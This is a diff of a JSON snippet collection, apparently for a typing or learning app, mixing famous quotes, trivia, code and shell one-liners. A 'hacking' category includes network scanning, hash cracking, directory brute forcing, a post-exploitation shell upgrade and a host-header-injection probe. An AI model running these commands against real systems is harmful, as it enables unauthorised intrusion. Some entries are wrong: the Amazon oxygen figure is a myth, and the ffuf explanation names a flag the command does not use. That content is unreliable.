-    "content": "tr -cs '[:alpha:]' '\\n' < book.txt | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -20",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "The classic word-frequency pipeline: split to one word per line, fold case, sort so duplicates are adjacent, count runs, order by count."
-  },
-  {
-    "category": "shell",
-    "content": "diff <(sort a.txt) <(sort b.txt)",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "Process substitution gives two commands to diff as if they were files, without writing either to disk."
-  },
-  {
-    "category": "business",
-    "content": "It is not from the benevolence of the butcher, the brewer, or the baker that we expect our dinner, but from their regard to their own interest.",
-    "attribution": "Adam Smith, The Wealth of Nations"
-  },
-  {
-    "category": "business",
-    "content": "If you are not embarrassed by the first version of your product, you have launched too late.",
-    "attribution": "Reid Hoffman"
-  },
-  {
-    "category": "nature",
-    "content": "Nature is not a place to visit. It is home.",
-    "attribution": "Gary Snyder"
-  },
-  {
-    "category": "quotes",
-    "content": "If there is no struggle, there is no progress. Those who profess to favor freedom, and yet depreciate agitation, are men who want crops without plowing up the ground.",
-    "attribution": "Frederick Douglass"
-  },
-  {
-    "category": "programming",
-    "content": "for i, v := range items { fmt.Printf(\"%d: %v\\n\", i, v) }",
-    "attribution": "Go",
-    "language": "clike",
-    "explanation": "range yields index and value. In Go before 1.22 the loop variable was reused each iteration, which surprised anyone capturing it in a closure."
-  },
-  {
-    "category": "shell",
-    "content": "grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' access.log | sort -u | wc -l",
-    "attribution": "Text processing",
-    "language": "shell",
-    "explanation": "grep -o prints only the match, one per line, which turns a search into a stream you can count."
-  },
-  {
-    "category": "business",
-    "content": "Price is what you pay. Value is what you get.",
-    "attribution": "Warren Buffett"
-  },
-  {
-    "category": "programming",
-    "content": "for (int i = 0; i < n; i++) { sum += a[i] * b[i]; }",
-    "attribution": "C",
-    "language": "clike",
-    "explanation": "A dot product. The bound is < n, not <= n; off-by-one here reads past the end of the array."
-  },
-  {
-    "category": "movies",
-    "content": "The greatest trick the devil ever pulled was convincing the world he didn't exist.",
-    "attribution": "The Usual Suspects (1995)"
-  },
-  {
-    "category": "quotes",
-    "content": "To be great is to be misunderstood.",
-    "attribution": "Ralph Waldo Emerson, Self-Reliance"
-  },
-  {
-    "category": "science",
-    "content": "The great tragedy of science: the slaying of a beautiful hypothesis by an ugly fact.",
-    "attribution": "Thomas Huxley"
-  },
-  {
-    "category": "hacking",
-    "content": "nmap -sS -sV -T4 --top-ports 1000 10.0.0.0/24",
-    "attribution": "Recon",
-    "language": "shell",
-    "explanation": "A TCP SYN scan of the top 1000 ports. -sV asks each open port for its service banner, which is what turns a port list into a target list."
-  },
-  {
-    "category": "technology",
-    "content": "A ship in port is safe, but that's not what ships are built for.",
-    "attribution": "Grace Hopper"
-  },
-  {
-    "category": "technology",
-    "content": "We have modified our environment so radically that we must now modify ourselves to exist in this new environment.",
-    "attribution": "Norbert Wiener"
-  },
-  {
-    "category": "hacking",
-    "content": "hashcat -m 0 -a 0 hashes.txt rockyou.txt --force",
-    "attribution": "Crypto",
-    "language": "shell",
-    "explanation": "An MD5 of a known-weak hash type. Modern password hashing exists because this takes seconds, not years."
-  },
-  {
-    "category": "shell",
-    "content": "comm -13 <(sort old.txt) <(sort new.txt)",
-    "attribution": "Pipelines",
-    "language": "shell",
-    "explanation": "comm compares two sorted files by column: -13 shows only lines unique to the second, which is the set that was added."
-  },
-  {
-    "category": "programming",
-    "content": "*counts.entry(word).or_insert(0) += 1;",
-    "attribution": "Rust",
-    "language": "rust",
-    "explanation": "entry().or_insert_with() looks the key up once. The obvious contains_key-then-insert hashes it twice."
-  },
-  {
-    "category": "movies",
-    "content": "Your scientists were so preoccupied with whether or not they could, they didn't stop to think if they should.",
-    "attribution": "Jurassic Park (1993)"
-  },
-  {
-    "category": "science",
-    "content": "There is grandeur in this view of life, with its several powers, having been originally breathed into a few forms or into one.",
-    "attribution": "Charles Darwin, On the Origin of Species"
-  },
-  {
-    "category": "business",
-    "content": "Disruptive technologies typically enable new markets to emerge, and they underperform established products in mainstream markets.",
-    "attribution": "Clayton Christensen, The Innovator's Dilemma"
-  },
-  {
-    "category": "literature",
-    "content": "It was the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness.",
-    "attribution": "Charles Dickens, A Tale of Two Cities"
+    "content": "The Socratic method uses a series of questions and answers to expose contradictions in a person's beliefs, encouraging deeper critical thinking rather than simply providing answers."
   },
   {
     "category": "shell",
@@ -1815,29 +269,55 @@
     "explanation": "Quoting \"$@\" preserves each argument exactly, including ones containing spaces. Unquoted $@ splits them apart."
   },
   {
-    "category": "business",
-    "content": "The real price of everything is the toil and trouble of acquiring it.",
-    "attribution": "Adam Smith, The Wealth of Nations"
+    "category": "anime",
+    "content": "Overspecialize, and you breed in weakness. It's slow death.",
+    "attribution": "Ghost in the Shell"
+  },
+  {
+    "category": "quotes",
+    "content": "It is not the critic who counts; not the man who points out how the strong man stumbles. The credit belongs to the man who is actually in the arena, whose face is marred by dust and sweat and blood.",
+    "attribution": "Theodore Roosevelt, Citizenship in a Republic"
   },
   {
     "category": "literature",
-    "content": "Alice was beginning to get very tired of sitting by her sister on the bank, and of having nothing to do. Once or twice she had peeped into the book her sister was reading, but it had no pictures or conversations in it.",
-    "attribution": "Lewis Carroll, Alice's Adventures in Wonderland"
+    "content": "The Time Traveller, for so it will be convenient to speak of him, was expounding a recondite matter to us. His grey eyes shone and twinkled, and his usually pale face was flushed and animated.",
+    "attribution": "H.G. Wells, The Time Machine"
+  },
+  {
+    "category": "anime",
+    "content": "Life is suffering. It is hard. The world is cursed. But still, you find reasons to keep on living.",
+    "attribution": "Princess Mononoke"
   },
   {
     "category": "literature",
-    "content": "All we have to decide is what to do with the time that is given us.",
-    "attribution": "J.R.R. Tolkien, The Fellowship of the Ring"
+    "content": "I read that every known superstition in the world is gathered into the horseshoe of the Carpathians, as if it were the centre of some sort of imaginative whirlpool, and it made me uneasy in a way I could not explain.",
+    "attribution": "Bram Stoker, Dracula"
   },
   {
-    "category": "movies",
-    "content": "Toto, I've a feeling we're not in Kansas anymore.",
-    "attribution": "The Wizard of Oz (1939)"
+    "category": "programming",
+    "content": "public static void main(String[] args) { System.out.println(\"ready\"); }",
+    "attribution": "Java",
+    "language": "clike",
+    "explanation": "Java's entry point. The signature is fixed: static so it runs without an instance, and taking the command-line arguments."
   },
   {
-    "category": "nature",
-    "content": "In nature nothing exists alone.",
-    "attribution": "Rachel Carson, Silent Spring"
+    "category": "literature",
+    "content": "Mr. Sherlock Holmes, who was usually very late in the mornings, save upon those not infrequent occasions when he was up all night, was seated at the breakfast table.",
+    "attribution": "Arthur Conan Doyle, The Hound of the Baskervilles"
+  },
+  {
+    "category": "sysadmin",
+    "content": "ssh -o ControlMaster=auto -o ControlPersist=10m -o ControlPath=~/.ssh/cm-%r@%h:%p host",
+    "attribution": "SSH",
+    "language": "shell",
+    "explanation": "Reuses one connection for subsequent sessions, so every later ssh or scp to the same host skips the handshake."
+  },
+  {
+    "category": "programming",
+    "content": "document.querySelectorAll('.row').forEach(el => el.classList.toggle('active'));",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "querySelectorAll returns a static NodeList, so it will not change as you mutate the elements in it."
   },
   {
     "category": "movies",
@@ -1845,11 +325,313 @@
     "attribution": "The Matrix (1999)"
   },
   {
+    "category": "science",
+    "content": "What we observe is not nature itself, but nature exposed to our method of questioning.",
+    "attribution": "Werner Heisenberg"
+  },
+  {
+    "category": "philosophy",
+    "content": "A journey of a thousand miles begins with a single step.",
+    "attribution": "Lao Tzu, Tao Te Ching"
+  },
+  {
+    "category": "philosophy",
+    "content": "It is not that we have a short time to live, but that we waste a lot of it.",
+    "attribution": "Seneca, On the Shortness of Life"
+  },
+  {
+    "category": "history",
+    "content": "You have to make more noise than anybody else, you have to fill all the papers more than anybody else.",
+    "attribution": "Emmeline Pankhurst, 1913"
+  },
+  {
+    "category": "science",
+    "content": "Nothing in life is to be feared, it is only to be understood. Now is the time to understand more, so that we may fear less.",
+    "attribution": "Marie Curie"
+  },
+  {
     "category": "hacking",
-    "content": "free(ptr); ptr->next = head; /* use after free: the block may belong to someone else now */",
-    "attribution": "Memory safety",
-    "language": "clike",
-    "explanation": "Freed then used. The allocator may hand that block to something else between the two lines, so the write lands in another object."
+    "content": "grep -rE '^[^#].*(ALL|NOPASSWD)' /etc/sudoers /etc/sudoers.d/ 2>/dev/null",
+    "attribution": "Defence",
+    "language": "shell",
+    "explanation": "Audits which accounts can escalate, and how. The answer is usually longer than anyone expects."
+  },
+  {
+    "category": "sysadmin",
+    "content": "find /etc /usr -type f -perm -o+w -ls 2>/dev/null",
+    "attribution": "Permissions",
+    "language": "shell",
+    "explanation": "World-writable files outside the places that are meant to be. A common way a service ends up modifiable by anyone."
+  },
+  {
+    "category": "anime",
+    "content": "If everyone is not special, maybe you can be what you want to be.",
+    "attribution": "Mob Psycho 100"
+  },
+  {
+    "category": "movies",
+    "content": "What we do in life echoes in eternity.",
+    "attribution": "Gladiator (2000)"
+  },
+  {
+    "category": "science",
+    "content": "The cosmos is within us. We are made of star-stuff. We are a way for the universe to know itself.",
+    "attribution": "Carl Sagan, Cosmos"
+  },
+  {
+    "category": "programming",
+    "content": "const { id, name = 'anonymous', ...rest } = await request.json();",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "Destructuring with a default and a rest property. The default applies only when the value is undefined, not when it is null."
+  },
+  {
+    "category": "programming",
+    "content": "const unique = [...new Set(values)].sort((a, b) => a - b);",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "A Set discards duplicates. Spreading it back to an array allows sorting; the comparator is required or numbers sort as text."
+  },
+  {
+    "category": "history",
+    "content": "I have a dream that my four little children will one day live in a nation where they will not be judged by the colour of their skin.",
+    "attribution": "Martin Luther King Jr., 1963"
+  },
+  {
+    "category": "literature",
+    "content": "Call me Ishmael. Some years ago, never mind how long precisely, having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world.",
+    "attribution": "Herman Melville, Moby-Dick"
+  },
+  {
+    "category": "programming",
+    "content": "let config: Config = toml::from_str(&fs::read_to_string(path)?)?;",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "The ? operator returns early on Err, converting the error type through From. It is what keeps error handling from nesting."
+  },
+  {
+    "category": "history",
+    "content": "I have cherished the ideal of a democratic and free society in which all persons live together in harmony and with equal opportunities.",
+    "attribution": "Nelson Mandela, 1964"
+  },
+  {
+    "category": "business",
+    "content": "The market can remain irrational longer than you can remain solvent.",
+    "attribution": "John Maynard Keynes"
+  },
+  {
+    "category": "anime",
+    "content": "When people are protecting something truly special to them, they truly can become as strong as they can be.",
+    "attribution": "Naruto"
+  },
+  {
+    "category": "hacking",
+    "content": "lsmod | awk 'NR>1 {print $1}' | while read m; do modinfo -n \"$m\" 2>/dev/null; done | grep -v '^/lib/modules'",
+    "attribution": "Defence",
+    "language": "shell",
+    "explanation": "Compares running kernel modules against what the package manager installed. An unexpected module is worth explaining."
+  },
+  {
+    "category": "movies",
+    "content": "All those moments will be lost in time, like tears in rain. Time to die.",
+    "attribution": "Blade Runner (1982)"
+  },
+  {
+    "category": "nature",
+    "content": "In wildness is the preservation of the world.",
+    "attribution": "Henry David Thoreau, Walking"
+  },
+  {
+    "category": "movies",
+    "content": "What we've got here is failure to communicate.",
+    "attribution": "Cool Hand Luke (1967)"
+  },
+  {
+    "category": "anime",
+    "content": "We fear that which we cannot see.",
+    "attribution": "Bleach"
+  },
+  {
+    "category": "shell",
+    "content": "diff <(sort a.txt) <(sort b.txt)",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "Process substitution gives two commands to diff as if they were files, without writing either to disk."
+  },
+  {
+    "category": "technology",
+    "content": "The most damaging phrase in the language is: we've always done it this way.",
+    "attribution": "Grace Hopper"
+  },
+  {
+    "category": "anime",
+    "content": "The only ones who should kill are those who are prepared to be killed.",
+    "attribution": "Code Geass"
+  },
+  {
+    "category": "anime",
+    "content": "Trees and people used to be good friends.",
+    "attribution": "My Neighbor Totoro"
+  },
+  {
+    "category": "nature",
+    "content": "In the woods, we return to reason and faith. There I feel that nothing can befall me in life which nature cannot repair.",
+    "attribution": "Ralph Waldo Emerson, Nature"
+  },
+  {
+    "category": "general",
+    "content": "Sharks existed long before trees. Fossil evidence suggests that sharks have been swimming in the oceans for more than four hundred million years, while the earliest trees did not appear until tens of millions of years later."
+  },
+  {
+    "category": "programming",
+    "content": "let mut counts: HashMap<String, usize> = HashMap::new();",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "mut because inserting mutates it. The type annotation is needed here since nothing yet tells the compiler what it holds."
+  },
+  {
+    "category": "hacking",
+    "content": "cur.execute('SELECT * FROM users WHERE name = %s AND active = %s', (name, True))",
+    "attribution": "Defence",
+    "language": "python",
+    "explanation": "Parameterised queries send the values separately from the statement, so nothing the user types can become SQL."
+  },
+  {
+    "category": "general",
+    "content": "The first computer programmer is widely considered to be Ada Lovelace, who wrote an algorithm for an early mechanical computer in the eighteen forties, decades before any machine capable of running it was ever built."
+  },
+  {
+    "category": "quotes",
+    "content": "Success is to be measured not so much by the position that one has reached in life as by the obstacles which he has overcome while trying to succeed.",
+    "attribution": "Booker T. Washington"
+  },
+  {
+    "category": "general",
+    "content": "The Eiffel Tower grows about six inches taller in the summer, as the iron structure expands slightly in the heat and contracts again once the weather cools."
+  },
+  {
+    "category": "technology",
+    "content": "Adding manpower to a late software project makes it later.",
+    "attribution": "Fred Brooks, The Mythical Man-Month"
+  },
+  {
+    "category": "anime",
+    "content": "Don't be afraid of things you don't understand. Just accept them as they are.",
+    "attribution": "Mushishi"
+  },
+  {
+    "category": "technology",
+    "content": "Security is a process, not a product.",
+    "attribution": "Bruce Schneier"
+  },
+  {
+    "category": "quotes",
+    "content": "Our greatest glory is not in never falling, but in rising every time we fall.",
+    "attribution": "Confucius"
+  },
+  {
+    "category": "general",
+    "content": "A single bolt of lightning can heat the surrounding air to temperatures hotter than the surface of the sun. The rapid expansion of that superheated air is what produces the crack of thunder we hear moments later."
+  },
+  {
+    "category": "science",
+    "content": "Somewhere, something incredible is waiting to be known.",
+    "attribution": "Carl Sagan"
+  },
+  {
+    "category": "anime",
+    "content": "When do you think people die? When they are forgotten.",
+    "attribution": "One Piece"
+  },
+  {
+    "category": "sysadmin",
+    "content": "docker system prune -af --volumes --filter 'until=168h'",
+    "attribution": "Containers",
+    "language": "shell",
+    "explanation": "Removes stopped containers, unused networks and dangling images. The usual cause of a full disk on a build host."
+  },
+  {
+    "category": "sysadmin",
+    "content": "df -i | awk '$5+0 > 80 {print}'",
+    "attribution": "Disk",
+    "language": "shell",
+    "explanation": "A disk that reports free space but still refuses writes is usually out of inodes, not bytes."
+  },
+  {
+    "category": "philosophy",
+    "content": "I think, therefore I am.",
+    "attribution": "Rene Descartes, Discourse on the Method"
+  },
+  {
+    "category": "programming",
+    "content": "export PATH=\"$HOME/.local/bin:$PATH\" && command -v rg >/dev/null || echo missing",
+    "attribution": "Shell",
+    "language": "shell",
+    "explanation": "Prepending puts your own binaries ahead of the system ones. command -v is the portable test for whether something is installed."
+  },
+  {
+    "category": "technology",
+    "content": "There is no code faster than no code.",
+    "attribution": "Kevlin Henney"
+  },
+  {
+    "category": "science",
+    "content": "An expert is a person who has made all the mistakes that can be made in a very narrow field.",
+    "attribution": "Niels Bohr"
+  },
+  {
+    "category": "general",
+    "content": "Simplicity is the soul of efficiency."
+  },
+  {
+    "category": "quotes",
+    "content": "You have power over your mind, not outside events. Realize this, and you will find strength.",
+    "attribution": "Marcus Aurelius, Meditations"
+  },
+  {
+    "category": "programming",
+    "content": "git bisect start HEAD v1.2.0 && git bisect run ./test.sh",
+    "attribution": "Git",
+    "language": "shell",
+    "explanation": "Finds the commit that introduced a bug by bisecting history. Give it a known-good and known-bad commit and it halves the range each step."
+  },
+  {
+    "category": "history",
+    "content": "I am tired of fighting. From where the sun now stands, I will fight no more forever.",
+    "attribution": "Chief Joseph, Nez Perce, 1877"
+  },
+  {
+    "category": "general",
+    "content": "Venus is the hottest planet in the solar system, even though Mercury sits closer to the sun. A thick blanket of carbon dioxide traps heat at the surface."
+  },
+  {
+    "category": "philosophy",
+    "content": "The beginning is the most important part of the work.",
+    "attribution": "Plato, The Republic"
+  },
+  {
+    "category": "programming",
+    "content": "match result { Ok(v) => println!(\"{v}\"), Err(e) => eprintln!(\"error: {e}\") }",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "match on a Result must cover both arms - the compiler rejects it otherwise, which is how Rust stops an error going unhandled."
+  },
+  {
+    "category": "quotes",
+    "content": "Failure is impossible.",
+    "attribution": "Susan B. Anthony"
+  },
+  {
+    "category": "shell",
+    "content": "make 2>&1 | tee build.log | grep -E 'error|warning'",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "tee writes to a file and passes the stream on, so you can log and keep processing in the same pipeline."
+  },
+  {
+    "category": "literature",
+    "content": "In my younger and more vulnerable years my father gave me some advice that I've been turning over in my mind ever since. Whenever you feel like criticizing anyone, he told me, just remember that all the people in this world haven't had the advantages that you've had.",
+    "attribution": "F. Scott Fitzgerald, The Great Gatsby"
   },
   {
     "category": "movies",
@@ -1857,9 +639,411 @@
     "attribution": "Mad Max: Fury Road (2015)"
   },
   {
+    "category": "philosophy",
+    "content": "Every new beginning comes from some other beginning's end.",
+    "attribution": "Seneca, Letters from a Stoic"
+  },
+  {
+    "category": "science",
+    "content": "I would rather have questions that can't be answered than answers that can't be questioned.",
+    "attribution": "Richard Feynman"
+  },
+  {
+    "category": "literature",
+    "content": "There was no possibility of taking a walk that day. We had been wandering, indeed, in the leafless shrubbery an hour in the morning, but since dinner the cold winter wind had brought with it clouds so sombre, and a rain so penetrating.",
+    "attribution": "Charlotte Bronte, Jane Eyre"
+  },
+  {
+    "category": "philosophy",
+    "content": "Stoicism is a school of ancient Greek philosophy that teaches the practice of virtue as the only true good, and encourages focusing only on what lies within one's own control."
+  },
+  {
+    "category": "science",
+    "content": "A new scientific truth does not triumph by convincing its opponents, but rather because its opponents eventually die.",
+    "attribution": "Max Planck"
+  },
+  {
+    "category": "history",
+    "content": "There are many causes that I am prepared to die for but no causes that I am prepared to kill for.",
+    "attribution": "Mahatma Gandhi"
+  },
+  {
+    "category": "general",
+    "content": "The Amazon rainforest produces roughly twenty percent of the oxygen found in the planet's atmosphere, earning it the nickname the lungs of the Earth."
+  },
+  {
+    "category": "technology",
+    "content": "We can only see a short distance ahead, but we can see plenty there that needs to be done.",
+    "attribution": "Alan Turing, Computing Machinery and Intelligence"
+  },
+  {
+    "category": "technology",
+    "content": "The question of whether a computer can think is no more interesting than the question of whether a submarine can swim.",
+    "attribution": "Edsger Dijkstra"
+  },
+  {
+    "category": "hacking",
+    "content": "openssl s_client -connect target:443 -servername target < /dev/null | openssl x509 -noout -text",
+    "attribution": "Crypto",
+    "language": "shell",
+    "explanation": "Reads the certificate a host presents. Expiry dates and hostname mismatches are found here, not in a browser warning."
+  },
+  {
+    "category": "nature",
+    "content": "It seems to me that the natural world is the greatest source of excitement, of visual beauty, of intellectual interest.",
+    "attribution": "David Attenborough"
+  },
+  {
     "category": "movies",
-    "content": "All those moments will be lost in time, like tears in rain. Time to die.",
-    "attribution": "Blade Runner (1982)"
+    "content": "Get busy living, or get busy dying.",
+    "attribution": "The Shawshank Redemption (1994)"
+  },
+  {
+    "category": "programming",
+    "content": "for name, score in zip(names, scores, strict=True): print(f'{name}: {score:>5.1f}')",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "zip pairs two sequences and stops at the shorter one. strict=True makes a length mismatch an error rather than silent truncation."
+  },
+  {
+    "category": "business",
+    "content": "Work expands so as to fill the time available for its completion.",
+    "attribution": "Parkinson's Law"
+  },
+  {
+    "category": "quotes",
+    "content": "Four score and seven years ago our fathers brought forth on this continent a new nation, conceived in Liberty, and dedicated to the proposition that all men are created equal.",
+    "attribution": "Abraham Lincoln, The Gettysburg Address"
+  },
+  {
+    "category": "movies",
+    "content": "I'm gonna make him an offer he can't refuse.",
+    "attribution": "The Godfather (1972)"
+  },
+  {
+    "category": "general",
+    "content": "Antarctica is technically the largest desert on the planet. Despite being covered in ice, it receives very little precipitation each year, which is the defining characteristic of a desert rather than temperature alone."
+  },
+  {
+    "category": "shell",
+    "content": "awk '{sum += $3} END {print sum, sum/NR}' numbers.txt",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "Sums a column and prints the average. END runs after the last line, so NR is the total row count by then."
+  },
+  {
+    "category": "science",
+    "content": "The most incomprehensible thing about the world is that it is comprehensible.",
+    "attribution": "Albert Einstein"
+  },
+  {
+    "category": "programming",
+    "content": "SELECT user_id, wpm, RANK() OVER (PARTITION BY mode ORDER BY wpm DESC) AS rank FROM results;",
+    "attribution": "SQL",
+    "language": "clike",
+    "explanation": "A window function ranks rows within each partition without collapsing them, which a GROUP BY cannot do."
+  },
+  {
+    "category": "philosophy",
+    "content": "It does not matter how slowly you go as long as you do not stop.",
+    "attribution": "Confucius, Analects"
+  },
+  {
+    "category": "literature",
+    "content": "It was the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness.",
+    "attribution": "Charles Dickens, A Tale of Two Cities"
+  },
+  {
+    "category": "literature",
+    "content": "My father's family name being Pirrip, and my Christian name Philip, my infant tongue could make of both names nothing longer or more explicit than Pip. So, I called myself Pip, and came to be called Pip.",
+    "attribution": "Charles Dickens, Great Expectations"
+  },
+  {
+    "category": "anime",
+    "content": "A lesson without pain is meaningless. That's because you cannot gain something without sacrificing something else in return.",
+    "attribution": "Fullmetal Alchemist"
+  },
+  {
+    "category": "programming",
+    "content": "if (typeof value !== 'string' || value.length === 0) { return null; }",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "A guard clause: reject the bad input first and return, instead of nesting the real work inside an if."
+  },
+  {
+    "category": "general",
+    "content": "The Great Wall of China was not built all at once. It was constructed and extended over many centuries by different dynasties, each adding new sections and rebuilding older ones to defend against invasions from the north."
+  },
+  {
+    "category": "science",
+    "content": "If you know you are on the right track, if you have this inner knowledge, then nobody can turn you off.",
+    "attribution": "Barbara McClintock"
+  },
+  {
+    "category": "nature",
+    "content": "In every walk with nature one receives far more than he seeks.",
+    "attribution": "John Muir"
+  },
+  {
+    "category": "general",
+    "content": "Bamboo is one of the fastest growing plants on Earth. Some species can grow nearly a meter in a single day under the right conditions, which is why it is used so widely in construction and manufacturing across Asia."
+  },
+  {
+    "category": "hacking",
+    "content": "ffuf -u https://target/FUZZ -w wordlist.txt -e .php,.bak,.old -mc 200,301,403",
+    "attribution": "Web",
+    "language": "shell",
+    "explanation": "Directory brute force. -x tries extensions, so index.php.bak and config.old surface alongside directories."
+  },
+  {
+    "category": "nature",
+    "content": "In some Native languages the term for plants translates to those who take care of us.",
+    "attribution": "Robin Wall Kimmerer, Braiding Sweetgrass"
+  },
+  {
+    "category": "sysadmin",
+    "content": "ss -ltnp | awk 'NR>1 {print $4, $6}'",
+    "attribution": "Network",
+    "language": "shell",
+    "explanation": "Listening sockets with the process behind each one. The modern replacement for netstat -tulpn."
+  },
+  {
+    "category": "shell",
+    "content": "awk -F: '{print $1, $7}' /etc/passwd",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "-F sets the field separator. This reads /etc/passwd and prints the username and shell, which are fields 1 and 7."
+  },
+  {
+    "category": "programming",
+    "content": "def fib(n): return n if n < 2 else fib(n - 1) + fib(n - 2)",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "Recursion with a base case. Correct but exponential - each call spawns two more, so it recomputes the same values repeatedly."
+  },
+  {
+    "category": "hacking",
+    "content": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "attribution": "Post-exploitation",
+    "language": "shell",
+    "explanation": "Upgrades a dumb shell to a real TTY, so job control, tab completion and su all start working."
+  },
+  {
+    "category": "movies",
+    "content": "I am big. It's the pictures that got small.",
+    "attribution": "Sunset Boulevard (1950)"
+  },
+  {
+    "category": "science",
+    "content": "The whole history of science has been the gradual realisation that events do not happen in an arbitrary manner.",
+    "attribution": "Stephen Hawking, A Brief History of Time"
+  },
+  {
+    "category": "movies",
+    "content": "Your scientists were so preoccupied with whether or not they could, they didn't stop to think if they should.",
+    "attribution": "Jurassic Park (1993)"
+  },
+  {
+    "category": "quotes",
+    "content": "That man over there says that women need to be helped into carriages, and lifted over ditches, and to have the best place everywhere. Nobody ever helps me into carriages, or over mud puddles, or gives me any best place, and ain't I a woman?",
+    "attribution": "Sojourner Truth, Ain't I a Woman?"
+  },
+  {
+    "category": "movies",
+    "content": "I'm as mad as hell, and I'm not going to take this anymore.",
+    "attribution": "Network (1976)"
+  },
+  {
+    "category": "anime",
+    "content": "If you win, you live. If you lose, you die. If you don't fight, you can't win.",
+    "attribution": "Attack on Titan"
+  },
+  {
+    "category": "general",
+    "content": "Honey never spoils if it is stored properly. Archaeologists have found pots of honey in ancient Egyptian tombs that are thousands of years old and still perfectly edible, preserved by its low moisture content and natural acidity."
+  },
+  {
+    "category": "business",
+    "content": "There is nothing so useless as doing efficiently that which should not be done at all.",
+    "attribution": "Peter Drucker"
+  },
+  {
+    "category": "technology",
+    "content": "All problems in computer science can be solved by another level of indirection.",
+    "attribution": "Butler Lampson"
+  },
+  {
+    "category": "science",
+    "content": "The first principle is that you must not fool yourself, and you are the easiest person to fool.",
+    "attribution": "Richard Feynman"
+  },
+  {
+    "category": "quotes",
+    "content": "Genius is one percent inspiration and ninety-nine percent perspiration.",
+    "attribution": "Thomas Edison"
+  },
+  {
+    "category": "quotes",
+    "content": "Stay hungry, stay foolish.",
+    "attribution": "Steve Jobs"
+  },
+  {
+    "category": "literature",
+    "content": "It was the best of times, it was the worst of times.",
+    "attribution": "Charles Dickens, A Tale of Two Cities"
+  },
+  {
+    "category": "anime",
+    "content": "I feel like I'm always searching for someone, or something.",
+    "attribution": "Your Name"
+  },
+  {
+    "category": "technology",
+    "content": "The best way to predict the future is to invent it.",
+    "attribution": "Alan Kay"
+  },
+  {
+    "category": "programming",
+    "content": "struct node { int value; struct node *next; };",
+    "attribution": "C",
+    "language": "clike",
+    "explanation": "A linked-list node. It refers to its own type through a pointer, which is legal because a pointer has a known size."
+  },
+  {
+    "category": "programming",
+    "content": "impl Display for Token { fn fmt(&self, f: &mut Formatter) -> Result { write!(f, \"{}\", self.0) } }",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "Implementing Display is what makes a type usable in {}. self.0 is the first field of a tuple struct."
+  },
+  {
+    "category": "history",
+    "content": "Never in the field of human conflict was so much owed by so many to so few.",
+    "attribution": "Winston Churchill, 1940"
+  },
+  {
+    "category": "sysadmin",
+    "content": "systemctl cat sshd.service && systemctl show sshd -p ExecStart",
+    "attribution": "systemd",
+    "language": "shell",
+    "explanation": "Shows what a unit will actually run, including drop-ins, after every override has been merged."
+  },
+  {
+    "category": "movies",
+    "content": "You mustn't be afraid to dream a little bigger, darling.",
+    "attribution": "Inception (2010)"
+  },
+  {
+    "category": "sysadmin",
+    "content": "ip route get 8.8.8.8",
+    "attribution": "Network",
+    "language": "shell",
+    "explanation": "Which route the kernel will actually use for a destination, including the source address it will pick."
+  },
+  {
+    "category": "philosophy",
+    "content": "Existentialism explores questions about individual freedom, choice, and meaning, arguing that people must create their own purpose in a universe that does not provide one automatically."
+  },
+  {
+    "category": "programming",
+    "content": "grep -rn \"TODO\" src/ | awk -F: '{print $1}' | sort -u",
+    "attribution": "Shell",
+    "language": "shell",
+    "explanation": "grep -n prints file:line:text, awk splits on the colon to take the filename, sort -u removes the duplicates."
+  },
+  {
+    "category": "general",
+    "content": "The Pacific Ocean covers more of the planet than all the continents combined. It stretches from the icy waters near Antarctica to the Arctic Circle, and its deepest point, the Mariana Trench, plunges nearly eleven kilometers below the surface."
+  },
+  {
+    "category": "sysadmin",
+    "content": "rsync -avhn --delete /src/ /dest/",
+    "attribution": "Backup",
+    "language": "shell",
+    "explanation": "Mirrors a tree, deletes what no longer exists on the source, and shows what it would do first. Never run this without -n the first time."
+  },
+  {
+    "category": "anime",
+    "content": "If you don't take risks, you can't create a future.",
+    "attribution": "One Piece"
+  },
+  {
+    "category": "hacking",
+    "content": "curl -H 'X-Forwarded-Host: attacker.test' -s https://target/reset | grep -i location",
+    "attribution": "Web",
+    "language": "shell",
+    "explanation": "A header the application echoes back into a redirect or a password-reset link is a host header injection."
+  },
+  {
+    "category": "literature",
+    "content": "Christmas won't be Christmas without any presents, grumbled Jo, lying on the rug. It's so dreadful to be poor, sighed Meg, looking down at her old dress.",
+    "attribution": "Louisa May Alcott, Little Women"
+  },
+  {
+    "category": "sysadmin",
+    "content": "dig +short @1.1.1.1 example.com A",
+    "attribution": "Network",
+    "language": "shell",
+    "explanation": "Resolves a name through a specific server, which is how you tell a stale local cache from a stale zone."
+  },
+  {
+    "category": "quotes",
+    "content": "It always seems impossible until it's done.",
+    "attribution": "Nelson Mandela"
+  },
+  {
+    "category": "technology",
+    "content": "The web as I envisaged it, we have not seen it yet. The future is still so much bigger than the past.",
+    "attribution": "Tim Berners-Lee"
+  },
+  {
+    "category": "programming",
+    "content": "const port = config.port ?? process.env.PORT ?? 8080;",
+    "attribution": "JavaScript",
+    "language": "javascript",
+    "explanation": "?? falls back only on null or undefined, unlike ||, which also fires on 0 and the empty string."
+  },
+  {
+    "category": "literature",
